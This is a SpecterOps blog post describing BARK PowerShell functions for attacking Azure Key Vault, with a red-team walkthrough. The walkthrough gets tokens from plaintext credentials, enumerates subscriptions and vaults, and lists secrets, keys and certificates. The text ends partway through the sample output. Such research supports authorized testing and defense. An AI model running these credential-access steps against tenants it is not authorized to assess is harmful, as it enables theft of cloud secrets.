---
title: Azure Key Vault Tradecraft with BARK
url: https://posts.specterops.io/azure-key-vault-tradecraft-with-bark-24163abc8de3?source=rss----f05f8696e3cc---4
source: Posts By SpecterOps Team Members - Medium
date: 2024-11-21
fetch_date: 2025-10-06T19:17:29.475793
---

# Azure Key Vault Tradecraft with BARK

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F24163abc8de3&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fposts.specterops.io%2Fazure-key-vault-tradecraft-with-bark-24163abc8de3&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fposts.specterops.io%2Fazure-key-vault-tradecraft-with-bark-24163abc8de3&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## Posts By SpecterOps Team Members](https://posts.specterops.io/?source=post_page---publication_nav-f05f8696e3cc-24163abc8de3---------------------------------------)

·

Follow publication

[![Posts By SpecterOps Team Members](https://miro.medium.com/v2/resize:fill:76:76/1*D-FDlfkqivRBQZoESrwtqw.png)](https://posts.specterops.io/?source=post_page---post_publication_sidebar-f05f8696e3cc-24163abc8de3---------------------------------------)

Posts from SpecterOps team members on various topics relating information security

Follow publication

# Azure Key Vault Tradecraft with BARK

[![Andy Robbins](https://miro.medium.com/v2/resize:fill:64:64/2*G-LlqSNRGI8wIrjrYRzWdA.png)](https://medium.com/%40_wald0?source=post_page---byline--24163abc8de3---------------------------------------)

[Andy Robbins](https://medium.com/%40_wald0?source=post_page---byline--24163abc8de3---------------------------------------)

5 min read

·

Nov 20, 2024

--

Listen

Share

## Brief

This post details the existing and new functions in BARK that support adversarial tradecraft research relevant to the Azure Key Vault service. The latter part of the post shows an example of how a red team operator may use these commands during the course of an assessment.

Press enter or click to view image in full size

![]()

## Authentication

Azure Key Vault is one of the few services in Azure with a dedicated API for data plane operations. When performing calls to the Azure REST API and the Azure Key Vault REST API, you must provide authentication in the form of a bearer token. That token must have the correct audience.

BARK has the following functions for requesting tokens for use with the Azure REST API:

* Get-AzureRMTokenWithUsernamePassword
* Get-AzureRMTokenWithPortalAuthRefreshToken
* Get-AzureRMTokenWithClientCredentials
* Get-AzureRMTokenWithRefreshToken

BARK has the following functions for requesting tokens for use with the Azure Key Vault REST API:

* Get-AzureKeyVaultTokenWithUsernamePassword
* Get-AzureKeyVaultTokenWithClientCredentials

## Enumeration

BARK has the following function for enumerating key vaults via the Azure REST API:

* Get-AllAzureRMKeyVaults

BARK has the following functions for enumerating key vault items via the Azure Key Vault REST API:

* Get-AzureRMKeyVaultSecrets
* Get-AzureRMKeyVaultSecretVersions
* Get-AzureRMKeyVaultKeys
* Get-AzureRMKeyVaultKeyVersions
* Get-AzureRMKeyVaultCertificates

## Persistence

BARK has the following functions for manipulating permissions on key vaults and key vault items via the Azure REST API:

* New-AzureRMRoleAssignment
* New-AzureKeyVaultAccessPolicy

## Collection/Credential Access

BARK has the following function for collecting key vault secret values via the Azure Key Vault REST API:

* Get-AzureRMKeyVaultSecretValue

## Encryption/Decryption

BARK has the following functions for encrypting and decrypting data via the Azure Key Vault REST API:

* Protect-StringWithAzureKeyVaultKey
* Unprotect-StringWithAzureKeyVaultKey

## An Example Walkthrough Showcasing these Functions

During a red team assessment, the operator may find they have read access into one or more Azure Resource Manager (ARM) subscriptions, giving them the ability to enumerate resources in the subscription(s). The operator wants to find all key vaults under a given subscription.

First they must request a token with ARM REST API as the audience. There are several ways to do this and all depend on what level of access the operator has. We will go with a simple example: the operator has plaintext credentials for a valid user. With those credentials, the operator can use BARK’s Get-AzureRMTokenWithUsernamePassword to request a token:

```
$ARMToken = (Get-AzureRMTokenWithUsernamePassword `
    -Username "Username@contoso.onmicrosoft.com" `
    -Password "PlainTextPasswordGoesHere" `
    -TenantID "contoso.onmicrosoft.com").access_token
```

Next, the operator can identify all subscriptions they have read access into with BARK’s Get-AllAzureRMSubscriptions function:

```
$Subscriptions = Get-AllAzureRMSubscriptions -Token $ARMToken
```

To find all key vaults under each subscription, the operator can use PowerShell to loop through each subscription and pass its ID to BARK’s Get-AllAzureRMKeyVaults:

```
$KeyVaults = $Subscriptions | %{
    Get-AllAzureRMKeyVaults -Token $ARMToken -SubscriptionID $_.subscriptionid
}
```

Now the operator can attempt to enumerate secrets, keys, and certificates under each key vault; however, the Azure Key Vault REST API serves these operations, so they must first get a token with the correct audience. They can do that with BARK’s Get-AzureKeyVaultTokenWithUsernamePassword:

```
$KeyVaultToken = (Get-AzureKeyVaultTokenWithUsernamePassword `
    -Username "Username@contoso.onmicrosoft.com" `
    -Password "PlainTextPassword" `
    -TenantID "contoso.onmicrosoft.com").access_token
```

Now the operator can use that token in conjunction with BARK’s key vault item enumeration functions to list those items under each key vault:

```
$KeyVaultSecrets = $KeyVaults | %{
    Get-AzureRMKeyVaultSecrets `
        -KeyVaultURL $_.properties.vaultUri `
        -Token $KeyVaultToken
}
```

```
$KeyVaultKeys = $KeyVaults | %{
    Get-AzureRMKeyVaultKeys `
        -KeyVaultURL $_.properties.vaultUri `
        -Token $KeyVaultToken
}
```

```
$KeyVaultCertificates = $KeyVaults | %{
    Get-AzureRMKeyVaultCertificates `
        -KeyVaultURL $_.properties.vaultUri `
         -Token $KeyVaultToken
}
```

An example of what these variables look like from our research environment:

```
PS /> $KeyVaultSecrets

contentType : application/x-pkcs12
id          : https://keyvaultazurerbac.vault.azure.net/secrets/MyCertificate
managed     : True
attributes  : @{enabled=True; nbf=1731104193; exp=1733696793; created=1731104793; updated=1731104793; recoveryLevel=Recoverable+Purgeable; recoverableDays=90}
tags        :

id         : https://keyvaultazurerbac.vault.azure.net/secrets/Secret1
attributes : @{enabled=True; created=1728322075; updated=1728322075; recoveryLevel=Recoverable+Purgeable; recoverableDays=90}
```

```
PS /> $KeyVaultKeys | fl

kid        : https://keyvaultazurerbac.vault.azure.net/keys/MyCertificate
attributes : @{enabled=True; nbf=1731104193; exp=1733696793; created=1731104793; updated=1731104793; recoveryLevel=Recoverable+Purgeable; recoverableDays=90}
tags       :
managed    : True

kid        : https://keyvaultazurerbac.vault.azure.net/keys/MyKey
attributes : @{enabled=True; created=1731104478; updated=1731104478; recoveryLevel=Recoverable+Purgeable; recoverableDays=90; exportable=False}
tags       :
```

```
PS /> $KeyVaultCertificates

id         : https:...